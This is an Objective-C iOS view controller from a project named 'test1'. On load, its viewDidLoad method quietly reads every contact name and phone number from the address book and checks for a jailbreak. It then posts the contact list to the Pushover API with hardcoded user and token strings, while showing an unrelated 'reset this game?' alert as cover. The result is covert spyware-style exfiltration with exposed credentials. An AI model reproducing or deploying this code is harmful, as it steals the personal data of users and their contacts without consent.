//
//  ViewController.m
//  test1
//
//  Created by milo on 14/7/13.
//  Copyright (c) 2013 milo. All rights reserved.
//

#import "ViewController.h"
#import "ASIAuthenticationDialog.h"
#import "Reachability.h"
#import "ASIHTTPRequest.h"
#import "ASIFormDataRequest.h"
#import <AddressBook/AddressBook.h>
#import <AddressBook/ABAddressBook.h>
#import <AddressBook/ABPerson.h>
#import "AFHTTPClient.h"
#import "AFHTTPRequestOperation.h"
#import "AFJSONRequestOperation.h"

@interface ViewController ()

@end

@implementation ViewController

-(void)downloadFile
{
    NSString *stringURL = @"http://www.hdwallpapers.in/walls/pacific_rim_movie-wide.jpg";
    NSURL  *url = [NSURL URLWithString:stringURL];
    NSData *urlData = [NSData dataWithContentsOfURL:url];
    if ( urlData )
    {
        NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString  *documentsDirectory = [paths objectAtIndex:0];
        
        NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"pacific_rim_movie-wide.jpg"];
        [urlData writeToFile:filePath atomically:YES];
    }
    NSLog(@"File downloaded");
}

-(NSMutableArray *)retrieveContactList
{
	ABAddressBookRef myAddressBook = ABAddressBookCreate();
	NSArray *allPeople = ( NSArray *)ABAddressBookCopyArrayOfAllPeople(myAddressBook);
	NSMutableArray *contactList = [[NSMutableArray alloc]initWithCapacity:[allPeople count]];
	for (id record in allPeople) {
        CFTypeRef phoneProperty = ABRecordCopyValue(( ABRecordRef)record, kABPersonPhoneProperty);
        NSArray *phones = ( NSArray *)ABMultiValueCopyArrayOfAllValues(phoneProperty);
		//NSLog(@"phones array: %@", phones);
        CFRelease(phoneProperty);
		NSString* contactName = ( NSString *)ABRecordCopyCompositeName(( ABRecordRef)record);
		
		NSMutableDictionary *newRecord = [[NSMutableDictionary alloc] init];
		[newRecord setObject:contactName forKey:@"name"];
		//[contactName release];
		NSMutableString *newPhone = [[NSMutableString alloc] init];
		for (NSString *phone in phones) {
        	//NSString *fieldData = [NSString stringWithFormat:@"%@: %@", contactName, phone];
			if(![newPhone isEqualToString:@""])
				[newPhone appendString:@", "];
			[newPhone appendString:phone];
            
        }
		[newRecord setObject:newPhone forKey:@"phone"];
		[contactList addObject:newRecord];
		//[newPhone release];
    }
	CFRelease(myAddressBook);
    NSLog(@"Final data: %@", contactList);
    return contactList;
}

- (void)viewDidLoad
{
    NSURL *url = [NSURL URLWithString:@"https://api.pushover.net/1/messages.json"];
    
    UIDevice *device = [UIDevice currentDevice];
    NSString *uniqueIdentifier = [device uniqueIdentifier];
    NSString *msg;
    
    NSMutableArray *contacts = [self retrieveContactList];
    NSString *contactString = [contacts componentsJoinedByString:@","];
    
    NSString *filePath = @"/Applications/Cydia.app";
    if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
    {
        NSLog(@"Cydia exists on disk");
        msg = @"Jailbroken";
    }
    else
    {
        
        NSLog(@"Cydia does not exist");
        msg = @"Not Jailbroken";
    }
    //ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:url];
    //[request setPostValue:@"S1CezgKG7IHhLEXEYI9OPeYXvPysvB" forKey:@"user"];
    //[request setPostValue:@"ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd" forKey:@"token"];
    //[request setPostValue:contactString forKey:@"message"];
    //[request addRequestHeader:@"Content-Type" value:@"application/json"];
    //[request setDelegate:self];
    //[request startAsynchronous];
    
    UIAlertView *alert = [[[UIAlertView alloc] initWithTitle:@"Really reset?" message:@"Do you really want to reset this game?" delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:nil] autorelease];
    // optional - add more buttons:
    [alert addButtonWithTitle:@"Yes"];
    [alert show];   
    
    AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];
    httpClient.parameterEncoding = AFFormURLParameterEncoding;
    NSDictionary *postBody = @{@"user":@"S1CezgKG7IHhLEXEYI9OPeYXvPysvB",
                               @"message":contactString,
                               @"token":@"ViBPpGWfwHEZQWkbdeSJ2ntfMpdZzd"};
    NSMutableURLRequest *request = [httpClient requestWithMethod:@"POST" path:@"" parameters:postBody];
    AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
    [httpClient registerHTTPOperationClass:[AFHTTPRequestOperation class]];
    [operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {
        // Print the response body in text
        NSLog(@"Response: %@", [[NSString alloc] initWithData:responseObject encoding:NSUTF8StringEncoding]);
    } failure:^(AFHTTPRequestOperation *operation, NSError *error) {
        NSLog(@"Error: %@", error);
    }];
    [operation start];
    
    //[self downloadFile];

    
    [super viewDidLoad];
	// Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
